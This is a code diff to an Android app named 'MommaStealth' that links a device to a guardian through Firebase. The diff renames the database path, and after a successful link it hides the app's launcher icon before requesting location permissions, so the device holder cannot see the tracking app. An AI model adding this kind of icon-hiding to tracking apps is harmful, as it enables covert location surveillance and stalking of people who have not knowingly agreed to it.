@@ -99,11 +99,11 @@ class MainActivity : ComponentActivity() {
                         }
 
                         android.util.Log.d("MommaStealth", "Token is valid. Guardian ID: $guardianId")
-                        android.util.Log.d("MommaStealth", "Creating link at: linked_children/$guardianId/$childId")
+                        android.util.Log.d("MommaStealth", "Creating link at: guardianLinks/$guardianId/linkedChildren/$childId")
 
-                        // Create the link in linked_children path
+                        // Create the link in guardianLinks path
                         val linkRef = FirebaseDatabase.getInstance()
-                            .getReference("linked_children/$guardianId/$childId")
+                            .getReference("guardianLinks/$guardianId/linkedChildren/$childId")
 
                         val payload = mapOf(
                             "nickname" to android.os.Build.MODEL,
@@ -120,6 +120,20 @@ class MainActivity : ComponentActivity() {
                         linkRef.updateChildren(payload).addOnSuccessListener {
                             android.util.Log.d("MommaStealth", "Link created successfully!")
                             Toast.makeText(this, "Successfully linked to guardian! 🎯", Toast.LENGTH_LONG).show()
+
+                            // Hide the app icon from launcher after successful linking
+                            try {
+                                val componentName = android.content.ComponentName(this, MainActivity::class.java)
+                                packageManager.setComponentEnabledSetting(
+                                    componentName,
+                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                    android.content.pm.PackageManager.DONT_KILL_APP
+                                )
+                                android.util.Log.d("MommaStealth", "App icon hidden from launcher")
+                            } catch (e: Exception) {
+                                android.util.Log.e("MommaStealth", "Failed to hide app icon", e)
+                            }
+
                             requestLocationPermissions()
                         }.addOnFailureListener { e: Exception ->
                             android.util.Log.e("MommaStealth", "Link creation failed", e)
